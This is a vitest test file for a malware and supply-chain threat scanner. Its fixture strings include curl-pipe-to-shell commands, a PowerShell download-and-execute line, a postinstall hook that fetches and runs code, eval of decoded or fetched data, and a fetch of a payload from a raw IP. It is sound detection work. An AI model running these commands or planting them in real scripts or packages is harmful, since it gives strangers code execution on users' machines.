import { describe, it, expect } from 'vitest';

import {
  scanSourceFile,
  scanScriptFile,
  scanPackageScripts,
  summarizeThreats,
  hasInstallHook,
  type ThreatFinding,
} from '../src/threats.js';

function find(fs: ThreatFinding[], id: string): ThreatFinding | undefined {
  return fs.find((f) => f.id === id);
}

describe('scanSourceFile — dynamic code execution', () => {
  it('leaves an ordinary file clean', () => {
    const f = scanSourceFile('src/a.ts', 'export const x = 1;\nfunction add(a: number, b: number) { return a + b; }\n');
    expect(f).toEqual([]);
  });

  it('flags a bare eval as medium (a smell, not an alarm)', () => {
    const f = scanSourceFile('src/a.ts', 'const r = eval(userInput);\n');
    expect(find(f, 'dynamic-code-execution')?.severity).toBe('medium');
  });

  it('flags eval of decoded data as critical (direct nest)', () => {
    const f = scanSourceFile('x.js', 'eval(atob("Zm9vYmFy"));\n');
    expect(find(f, 'dynamic-code-execution')?.severity).toBe('critical');
  });

  it('flags decode-then-execute as critical (proximity)', () => {
    const src = 'const p = Buffer.from(BLOB, "base64").toString();\nnew Function(p)();\n';
    expect(find(scanSourceFile('x.js', src), 'dynamic-code-execution')?.severity).toBe('critical');
  });

  it('flags execute-of-fetched as critical (proximity to network)', () => {
    const src = 'const c = await fetch(url).then((r) => r.text());\neval(c);\n';
    expect(find(scanSourceFile('x.js', src), 'dynamic-code-execution')?.severity).toBe('critical');
  });

  it('rates decode + exec that sit far apart as high, not critical', () => {
    const src = 'const p = Buffer.from(B, "base64").toString();\n' + 'const y = 1;\n'.repeat(300) + 'eval(p);\n';
    expect(find(scanSourceFile('x.js', src), 'dynamic-code-execution')?.severity).toBe('high');
  });
});

describe('scanSourceFile — obfuscation, command exec, IOCs', () => {
  it('rates a lone large base64 blob as low (could be an inlined asset)', () => {
    const blob = 'A'.repeat(250);
    const f = scanSourceFile('x.js', `const data = "${blob}";\n`);
    expect(find(f, 'obfuscated-blob')?.severity).toBe('low');
    expect(find(f, 'dynamic-code-execution')).toBeUndefined();
  });

  it('rates a blob that is decoded as high (concealed payload)', () => {
    const blob = 'A'.repeat(250);
    const f = scanSourceFile('x.js', `const d = atob("${blob}");\n`);
    expect(find(f, 'obfuscated-blob')?.severity).toBe('high');
  });

  it('flags child_process combined with network as medium (surface, not hard-block)', () => {
    const src = 'const cp = require("child_process");\nfetch("http://example.com");\n';
    expect(find(scanSourceFile('x.js', src), 'command-execution')?.severity).toBe('medium');
  });

  it('flags obfuscated access to eval as high even with no decode or network', () => {
    const f = scanSourceFile('x.js', 'const r = window["eval"]("1+1");\n');
    expect(find(f, 'dynamic-code-execution')?.severity).toBe('high');
  });

  it('flags Function called directly with a string literal', () => {
    const f = scanSourceFile('x.js', 'const run = Function("return 2")();\n');
    expect(find(f, 'dynamic-code-execution')).toBeDefined();
  });

  it('does NOT flag child_process on its own (common in CLIs)', () => {
    const f = scanSourceFile('x.js', 'const cp = require("child_process"); cp.exec("ls");\n');
    expect(find(f, 'command-execution')).toBeUndefined();
    expect(find(f, 'dynamic-code-execution')).toBeUndefined();
  });

  it('flags the ipcheck-encrypted marker as critical', () => {
    const f = scanSourceFile('x.js', 'const u = "https://evil.example/ipcheck-encrypted";\n');
    expect(find(f, 'ioc-endpoint')?.severity).toBe('critical');
  });

  it('flags a fetch to a raw IP address as medium', () => {
    const f = scanSourceFile('x.js', 'fetch("http://185.212.1.9/payload");\n');
    expect(find(f, 'hardcoded-ip')?.severity).toBe('medium');
  });

  it('does not flag an ordinary fetch of JSON', () => {
    const src = 'export async function load() { const r = await fetch("https://api.example.com/data"); return r.json(); }\n';
    expect(scanSourceFile('api.ts', src)).toEqual([]);
  });

  it('does not flag a fetch to localhost or a private IP', () => {
    expect(scanSourceFile('x.js', 'fetch("http://127.0.0.1:3000/api");\n')).toEqual([]);
    expect(scanSourceFile('x.js', 'fetch("http://192.168.1.5/status");\n')).toEqual([]);
  });

  it('redacts evidence to a single capped line', () => {
    const blob = 'A'.repeat(400);
    const ev = find(scanSourceFile('x.js', `const d = atob("${blob}");\n`), 'obfuscated-blob')!.evidence;
    expect(ev.length).toBeLessThanOrEqual(125);
    expect(ev).not.toContain('\n');
  });
});

describe('scanScriptFile', () => {
  it('flags curl piped to a shell as critical', () => {
    expect(find(scanScriptFile('setup.sh', 'curl https://x.example/i.sh | sh\n'), 'curl-pipe-shell')?.severity).toBe('critical');
  });

  it('flags PowerShell download-and-execute as high', () => {
    const f = scanScriptFile('a.ps1', 'IEX (New-Object Net.WebClient).DownloadString("http://x")\n');
    expect(find(f, 'powershell-download-exec')?.severity).toBe('high');
  });

  it('leaves an ordinary script clean', () => {
    expect(scanScriptFile('a.sh', 'echo building\nls -la\n')).toEqual([]);
  });
});

describe('scanPackageScripts', () => {
  it('flags a benign install hook as low (still runs on install)', () => {
    const f = scanPackageScripts({ postinstall: 'node scripts/build.js', test: 'vitest' });
    expect(f.length).toBe(1);
    expect(find(f, 'install-hook')?.severity).toBe('low');
  });

  it('flags an install hook that fetches and runs code as critical', () => {
    const f = scanPackageScripts({ postinstall: 'curl http://x.example/a | sh' });
    expect(find(f, 'install-hook-rce')?.severity).toBe('critical');
  });

  it('treats prepare as an install-time hook', () => {
    expect(find(scanPackageScripts({ prepare: 'husky install' }), 'install-hook')?.severity).toBe('low');
  });

  it('ignores non-lifecycle scripts', () => {
    expect(scanPackageScripts({ test: 'vitest', build: 'tsc' })).toEqual([]);
    expect(scanPackageScripts(undefined)).toEqual([]);
  });
});

describe('summarizeThreats', () => {
  const mk = (severity: ThreatFinding['severity']): ThreatFinding => ({ id: 'x', title: 't', severity, file: 'a', evidence: 'e', why: 'w' });

  it('is dangerous on any critical or high', () => {
    expect(summarizeThreats([mk('critical')], 1).verdict).toBe('dangerous');
    expect(summarizeThreats([mk('high')], 1).verdict).toBe('dangerous');
  });

  it('is suspicious on a medium', () => {
    expect(summarizeThreats([mk('medium')], 1).verdict).toBe('suspicious');
  });

  it('stays clean on a lone low finding (no crying wolf)', () => {
    expect(summarizeThreats([mk('low')], 1).verdict).toBe('clean');
    expect(summarizeThreats([], 1).verdict).toBe('clean');
  });

  it('sorts most severe first', () => {
    const s = summarizeThreats([mk('low'), mk('critical'), mk('medium')], 3);
    expect(s.findings[0].severity).toBe('critical');
  });

  it('hasInstallHook detects install-time findings', () => {
    const s = summarizeThreats(scanPackageScripts({ postinstall: 'node build.js' }), 1);
    expect(hasInstallHook(s)).toBe(true);
    expect(hasInstallHook(summarizeThreats([], 0))).toBe(false);
  });
});
